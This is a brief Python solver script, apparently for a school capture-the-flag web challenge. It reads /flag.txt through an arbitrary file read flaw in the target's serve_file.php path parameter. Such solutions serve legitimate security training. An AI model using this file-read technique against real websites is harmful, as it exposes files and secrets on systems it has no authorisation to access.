#!/bin/python3

import os
import requests
from pwn import *
import logging

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://gallery.challs.cyberhighschools.it")
if URL.endswith("/"):
    URL = URL[:-1]

res = requests.get(f"{URL}/serve_file.php?path=/flag.txt")
if not res.ok:
    print(f"Cannot contact {URL}")
    exit(1)

flag = res.text
print(flag)
